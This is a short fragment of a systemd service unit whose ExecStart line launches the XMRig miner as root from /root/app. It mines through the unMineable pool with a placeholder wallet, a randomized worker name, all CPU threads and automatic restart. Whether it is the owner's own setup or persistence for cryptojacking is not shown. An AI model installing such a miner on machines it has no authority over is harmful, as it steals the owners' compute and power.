...
ExecStart=/usr/bin/bash -c "PATH=/usr/local/bin:$PATH exec /root/app/xmrig/xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SHIB:0x0000000000000000000000000000000000000.amd-$$[RANDOM%%65535] -p x -t $$(nproc)"
Restart=on-failure
